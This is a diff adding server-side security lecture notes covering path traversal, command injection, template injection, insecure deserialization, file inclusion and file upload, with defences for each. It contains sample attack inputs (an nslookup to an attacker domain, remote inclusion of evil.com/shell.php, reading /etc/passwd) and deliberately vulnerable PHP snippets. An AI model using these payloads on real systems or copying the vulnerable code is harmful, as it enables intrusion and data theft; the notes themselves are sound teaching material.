@@ -741,3 +741,137 @@ Connections to such domains are subject to strong HSTS policies.
   to at least 1 year and includeSubDomains;
 - The HSTS policy must include the preload option.
 #+end_quote
+
+* Server-side security
+
+** Path traversal
+Path traversal is a well-known web security vulnerability which allows the
+attacker to *read arbitrary files from the web server*.
+
+Path traversal is typically presented as an attack against confidentiality, but
+it can also be used to break integrity: *By uploading a file with name
+../index.php*, the attacker might be able to take full control of the web
+application logic!
+
+*** Protecting against path traversal
+Like for most injection vulnerabilities, the most important rule to keep in mind
+against path traversal is: don’t do it by yourself!
+- use an existing API to *canonicalize the filename*, i.e., to uniquely resolve it
+  into an absolute path
+- perform the security checks over the canonicalized filename, e.g., *check that
+    it starts with the expected base directory*
+
+** Command injection
+Command injection is an infamous web security vulnerability which allows the
+attacker to execute *arbitrary OS commands on the server*.
+
+Since command injection leverages a call to an OS command, most of the times the
+attacker is forced to *play blind*. In particular, the following side-channels are
+useful to identify room for command injection:
+1) *time delays*, e.g., ping -c 10 127.0.0.1
+2) *output redirection*, e.g., whoami > /var/www/static/whoami.txt
+3) *DNS resolution*, e.g., nslookup canary.attacker.com
+
+*** Preventing Command injection
+The best way to defend against command injection is to avoid calls to external
+OS commands:
+- Most of the times, you can use *application-level libraries* for the same task:
+  this is generally more secure;
+- If this is not possible, *sanitize your input by using existing libraries*,
+  e.g., shlex.quote in Python escapes shell metacharacters;
+- *Separate commands from parameters by using the APIs* of your programming
+  language, e.g., subprocess.run in Python
+
+** Templates
+Server-side programming languages often use templates: Templates might suffer
+from *XSS vulnerabilities*, though web frameworks often provide auto-escaping
+features.
+
+If the attacker is able to provide inputs which get rendered as a template, the
+application suffers from a server-side template injection vulnerability.
+
+Unsafe example: rendering a welcome message from a custom template
+#+begin_src php
+$output = $twig->render($_GET[’custom_message’],
+              array("first_name" => $user.first_name) );
+#+end_src
+
+
+** Insecure deserialization
+#+begin_quote
+*Serialization*: The process of converting complex data structures into a “flat”
+ format, amenable for network communication or storage.
+#+end_quote
+
+Deserialization turns a serialized object back into its original state:
+- dangerous when this involves *user-controlled* data
+- damage can be done even before deserialization is finished, e.g., exceptions
+  leading to DoS or abuse of magic methods like wakeup
+- weakly typed programming languages are particularly at risk, yet strong typing
+  only mitigates the issue
+
+*** Example
+#+begin_src php
+$login = unserialize($_COOKIE["auth"])
+if ($login[’password’] == $password) {
+  // log in successfully
+}
+#+end_src
+
+This allows authentication bypasses, due to subtle ingredients:
+- the loose comparison operator == can equate two elements with different types
+- we have 0 == "Any string not starting with numbers"
+- this only works when the serialized object contains 0 as integer, not
+as string
+
+*** Impact and defenses
+Insecure deserialization may have dangerous consequences:
+1) remote code execution;
+2) privilege escalation and authentication bypasses
+3) denial of service
+4) data-only attacks
+
+To prevent insecure deserialization:
+- *do not serialize user-controlled data*!
+- if you really need to do that, sign the serialized data and *check their
+    integrity* before attempting deserialization
+- do not serialize objects: use pure data format like *JSON*
+
+** File inclusion
+A file inclusion vulnerability happens when a web application includes
+server-side code without appropriate sanitization. We will discuss this in the
+context of PHP, but other languages like JSP are also vulnerable.
+
+#+begin_src
+https://foo.com/index.php?page=contacts.php
+#+end_src
+
+Malicious usages:
+- Denial of service: ?page=index.php
+- Remote file inclusion: ?page=https://evil.com/shell.php
+- Local file inclusion: ?page=/uploads/shell.php
+- Data exfiltration: ?page=../../etc/passwd
+
+*** Preventing File Inclusion Vulnerabilities
+The best solution against file inclusion vulnerabilities is to use a whitelist
+of allowed resources for inclusion.
+
+** Unrestricted File Upload
+Uploaded files represent a significant risk to web apps: after uploading code,
+the attacker only needs to find a way to get it executed.
+
+It might be surprising to realize that many files are dangerous:
+- HTML: enabler for persistent XSS
+- SVG: supports inline JavaScript
+
+*** Preventing UFU
+Unrestricted file upload is complicated to deal with, hence also difficult to
+detect automatically:
+1) sanitize the content of the filename (for application integrity)
+2) file extensions cannot be trusted, but white-listing them is useful because
+   some programs require specific extensions to operate
+3) check / sanitize / re-encode the content of the uploaded files
+4) restrict upload operations to authenticated users
+5) put the uploaded files out of the webroot / on an external domain, so that
+   SOP can provide protection
+6) put a limit on the file size to avoid denial of service.
